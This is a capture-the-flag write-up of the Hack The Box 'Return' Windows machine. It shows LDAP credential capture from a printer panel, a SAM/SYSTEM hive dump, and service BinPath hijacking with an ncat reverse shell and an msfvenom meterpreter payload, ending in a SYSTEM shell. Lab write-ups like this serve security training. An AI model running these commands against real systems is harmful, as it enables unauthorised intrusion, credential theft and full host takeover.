## Box: Return

> damiano gubiani

```bash
export IP=10.10.11.108
```


# Enumerating

> nmap

```bash
# Nmap 7.95 scan initiated Mon Apr 21 08:51:10 2025 as: /usr/lib/nmap/nmap -sS -sV -sC -oN nmap/fst -vv 10.10.11.108
Nmap scan report for 10.10.11.108 (10.10.11.108)
Host is up, received echo-reply ttl 127 (0.082s latency).
Scanned at 2025-04-21 08:51:11 EDT for 20s
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-21 13:09:52Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-21T13:09:57
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 31931/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 54836/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 26260/udp): CLEAN (Timeout)
|   Check 4 (port 40628/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 18m33s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 21 08:51:31 2025 -- 1 IP address (1 host up) scanned in 20.30 seconds

```

> smb

```bash
nxc smb $IP -u 'guest' -p '' --shares  

SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [-] return.local\guest: STATUS_ACCOUNT_DISABLED 
```

lets check the web page

> gobuster

```bash
gobuster dir -u http://10.10.11.108/ -t 100 --no-error -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium -x html,cgi,txt,php

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.108/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,cgi,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.10.11.108/images/]
/index.php            (Status: 200) [Size: 28274]
/Images               (Status: 301) [Size: 150] [--> http://10.10.11.108/Images/]
/Index.php            (Status: 200) [Size: 28274]
/settings.php         (Status: 200) [Size: 29090]
/IMAGES               (Status: 301) [Size: 150] [--> http://10.10.11.108/IMAGES/]
/INDEX.php            (Status: 200) [Size: 28274]
/SETTINGS.php         (Status: 200) [Size: 29090]

```

we changed the setting with out IP and PORT and started a listener with netcat founding the password

```bash
nc -lvp 389                           

listening on [any] 389 ...
connect to [10.10.16.18] from 10.10.11.108 [10.10.11.108] 52774
0*`%return\svc-printer�
                       1edFg43012!!
```

> svc-printer:1edFg43012!!

lets try to remote the machine

```bash
evil-winrm -i $IP -u $user -p $passwd                                  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

# privilage escaletion

lets check our permission

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

```

as we can see we are SeBackupPrivilege privilaged , lets get sam and system to create out ticket 

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> reg save hklm\system system
The operation completed successfully.

```

lets download them

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> download sam
                                        
Info: Downloading C:\Users\svc-printer\Documents\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\svc-printer\Documents> download system
                                        
Info: Downloading C:\Users\svc-printer\Documents\system to system
                                        
Info: Download successful!

```

and finaly lets get the admin ticket

```bash
samdump2 system sam 

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

passing the hash didnt yield any result

lets get back and check what we can do again

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer

User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 1:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.

```

seems we are a server operators , we can change and start services , lets exploit this

lets check what services are running with high privilage

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"   
```

lets upload netcat on thwe windows machine

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload ncat.exe
```

and now we change the service BinPath

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VMTools BinPath='C:\Users\svc-printer\Documents\ncat.exe -e cmd.exe 10.10.16.18 8888'
```

after that we stop and start the services and we should get a reverse shell with system privilage

```bash
nc -lvp 8888

listening on [any] 8888 ...
connect to [10.10.16.18] from 10.10.11.108 [10.10.11.108] 52872
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

but its very unstable , so lets get msfvenom payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.18 LPORT=8888 -f exe -o reverse.exe
```

lets start metasploit with the multi handler exploit

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost=tun0
set lport 8888
run
```

lets upload it and start the payload as we did with ncat

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VMTools BinPath='C:\Users\svc-printer\Documents\reverse.exe'
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop VMTools
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VMTools
```

we got our systemshell

```bash
meterpreter > shell
Process 4352 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```
